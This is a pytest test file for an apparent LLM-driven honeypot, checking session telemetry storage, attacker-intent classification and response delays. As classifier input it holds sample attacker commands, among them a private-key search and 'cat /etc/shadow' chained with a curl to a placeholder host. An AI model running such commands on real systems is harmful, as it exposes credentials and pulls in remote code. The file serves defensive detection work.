import asyncio
import time
from dataclasses import replace

from honeypot.config import HoneypotSettings, default_services
from honeypot.deception import GeminiDeceptionEngine, IntentClassifier
from honeypot.models import DecoySession, TelemetryEvent
from honeypot.store import TelemetryStore


def test_store_records_session_event_and_investigation(tmp_path):
    store = TelemetryStore(tmp_path / "telemetry.db")
    session = DecoySession(
        session_id="ses_test",
        source_ip="192.0.2.20",
        source_port=41000,
        destination_port=2323,
        service="Telnet",
        protocol="telnet",
        persona="test appliance",
    )
    store.create_session(session)
    event = TelemetryEvent(
        session_id=session.session_id,
        event_type="CREDENTIAL_DISCOVERY",
        severity="critical",
        direction="inbound",
        content="find / -name '*.pem'",
        byte_count=21,
    )
    store.record_event(event)
    store.save_investigation(
        event_id=event.event_id,
        session_id=session.session_id,
        risk_score=91,
        risk_level="critical",
        intent="Credential access",
        intent_confidence=0.94,
        mitre=["T1552"],
        rationale="decoy credential search",
        investigation={"ok": True},
    )

    saved = store.get_session(session.session_id)
    assert saved is not None
    assert saved["bytes_in"] == 21
    assert saved["risk_score"] == 91
    assert saved["analysis"]["mitre"] == ["T1552"]
    assert store.metrics()["unique_sources"] == 1
    assert store.export_session(session.session_id)["events"][0]["sha256"]
    store.close()


def test_intent_and_fallback_never_execute(tmp_path):
    settings = HoneypotSettings(
        database_path=tmp_path / "unused.db",
        certificate_dir=tmp_path / "certs",
        enable_gemini=False,
        services=tuple(replace(item, port=0) for item in default_services()),
    )
    engine = GeminiDeceptionEngine(settings)
    result = IntentClassifier.classify("cat /etc/shadow && curl http://bad.invalid/x")
    assert result.event_type == "PAYLOAD_TRANSFER"
    assert result.severity == "critical"
    response = engine._fallback(default_services()[1], "whoami", {})
    assert response == "backup"


def test_configured_response_delay_is_applied(tmp_path):
    settings = HoneypotSettings(
        database_path=tmp_path / "delay.db",
        certificate_dir=tmp_path / "certs",
        enable_gemini=False,
        min_response_delay_seconds=0.02,
        max_response_delay_seconds=0.02,
    )
    engine = GeminiDeceptionEngine(settings)
    started = time.perf_counter()
    _, metadata = asyncio.run(
        engine.respond(
            session_id="ses_delay",
            profile=default_services()[1],
            attacker_input="whoami",
        )
    )

    assert time.perf_counter() - started >= 0.018
    assert metadata["artificial_delay_ms"] == 20
